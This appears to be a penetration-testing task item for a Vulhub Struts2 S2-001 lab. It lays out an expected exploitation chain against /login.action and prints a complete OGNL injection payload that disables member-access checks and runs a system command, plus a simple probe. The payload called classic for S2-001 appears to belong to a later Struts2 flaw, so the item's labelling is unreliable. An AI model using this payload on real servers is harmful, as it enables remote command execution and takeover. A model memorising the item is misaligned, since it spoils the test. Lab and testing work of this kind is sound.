title: Vulhub Struts2 S2-001 — OGNL injection via form repopulation (RCE)

expected_chain.rationale: GET /login.action to see the form structure
POST malformed login with OGNL payload %{...} in username field
validate command output in response body (e.g. id, whoami, getRuntime().exec)

notes: S2-001 — Struts2 form repopulation parses %{...} OGNL expressions in user-submitted values when validation fails. Classic payload: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('id'))}. Simpler PoC: %{1+1} returns 2 if vulnerable. Target /login.action via POST with name= field carrying payload.
